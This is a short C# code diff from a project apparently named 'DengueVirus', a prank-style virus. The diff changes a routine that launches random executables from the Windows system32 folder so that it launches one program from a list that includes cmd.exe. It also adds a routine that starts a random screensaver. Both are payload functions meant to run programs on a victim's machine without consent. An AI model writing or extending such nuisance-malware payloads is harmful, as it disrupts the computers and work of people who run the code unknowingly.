@@ -66,13 +66,30 @@ namespace DengueVirus.Spicy
 
         public static void OpenRandomEXE()
         {
-            // Open a random exe file from system32
+            /*// Open a random exe file from system32
             string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.exe");
             Random random = new Random();
             for (int i = 0; i < 5; i++)
             {
                 Process.Start(files[random.Next(files.Length)]);
-            }
+            }*/
+            // Open a random exe file from system32, from a string with its names
+            string[] files = { "notepad.exe", "calc.exe", "mspaint.exe", "cmd.exe", "explorer.exe", "write.exe" };
+            Random random = new Random();
+
+            Process.Start(files[random.Next(files.Length)]);
+
+        }
+
+        public static void OpenRandomScreensaver()
+        {
+            // Open a random screensaver file from system32
+            string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.scr");
+            Random random = new Random();
+            //for (int i = 0; i < 5; i++)
+            //{
+                Process.Start(files[random.Next(files.Length)]);
+            //}
         }
 
         public static void OpenRandomBatchFile()
